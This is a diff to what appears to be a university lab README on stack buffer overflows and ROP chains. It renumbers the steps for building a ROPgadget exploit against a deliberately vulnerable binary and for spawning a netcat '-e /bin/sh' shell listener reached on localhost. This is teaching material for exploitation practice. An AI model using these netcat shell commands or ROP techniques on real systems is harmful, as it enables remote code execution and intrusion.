@@ -32,29 +32,30 @@ sudo apt install -y python3-pip gdb gcc-multilib
 pip3 install capstone
 ```
 
-0. Download ROPGadget and install from: [URL](https://github.com/JonathanSalwan/ROPgadget). Its a github repo, so you can either clone it or (suggested) simple use "Download zip" option. 
-1. Download netcat (the latest release of netcat that comes pre-installed in Ubuntu has removed a particular option (-e) that we need.
+1.  Download ROPGadget and install from: [URL](https://github.com/JonathanSalwan/ROPgadget). Its a github repo, so you can either clone it or (suggested) simple use "Download zip" option. 
+2.  Download netcat (the latest release of netcat that comes pre-installed in Ubuntu has removed a particular option (-e) that we need.
 Having said that, official netcat release still shipped with that option! So, we are not completely artificial ;). [URL:](https://sourceforge.net/projects/netcat/). However, the same is also avaialble [here](../code/nc071.tar.gz).
-2. untar it and build: `./configure` and `make` command (**do not do** *make install*!)
-3. move `src/netcat` to `/tmp/nc`: `cp src/netcat /tmp/nc` (check if the binary is working as expected `/tmp/nc --help`).
-4. Compile [vuln3.c](../code/vuln3.c) as `gcc -fno-stack-protector -m32 -static vuln3.c -o vuln3-32`
-5. Find the amount of padding you'll need to overflow the buffer and start overwriting the saved return address.
-6. Use ROPgadget to build a ROP shellcode. 
+3.  untar it and build: `./configure` and `make` command (**do not do** *make install*!)
+4.  move `src/netcat` to `/tmp/nc`: `cp src/netcat /tmp/nc` (check if the binary is working as expected `/tmp/nc --help`).
+5.  Compile [vuln3.c](../code/vuln3.c) as `gcc -fno-stack-protector -m32 -static vuln3.c -o vuln3-32`
+6.  Find the amount of padding you'll need to overflow the buffer and start overwriting the saved return address.
+7.  Use ROPgadget to build a ROP shellcode. 
 
 		ROPgadget --binary vuln3-32 --ropchain > out-rop.txt
 		
    Have a look at `out-rop.txt`.  You'll see that at the bottom there is a Python program which you can complete to generate your shellcode exploit (in particular the buffer padding).  Run the program generate the exploit and test it works with the vulnerable program.
-7. The shellcode in the previous step execve'd `/bin/sh`.  This time we'd like you to run the following command:
+8.  The shellcode in the previous step execve'd `/bin/sh`.  This time we'd like you to run the following command:
 
 		/tmp/nc -lnp 5678 -tte /bin/sh
 
    This command will spawn a reverse-shell server listening on localhost port 5678 that feeds all the input it gets into `/bin/sh`.  Effectively enabling you to run programs remotely!
 We're giving helper files to consult which provide a similar exploit for a different machine: [exploit-nc.py](../code/exploit-nc.py), but you'll need to get it working on *your* machine.  In particular the gadgets, configuration and Python version may be different!
-8. Once successful, open another terminal and type:  
+9.  Once successful, open another terminal and type:  
 ```
 $/tmp/nc 127.0.0.1 5678
 pwd
 ```
+You've got a reverse shell!
 
 # Hints
 
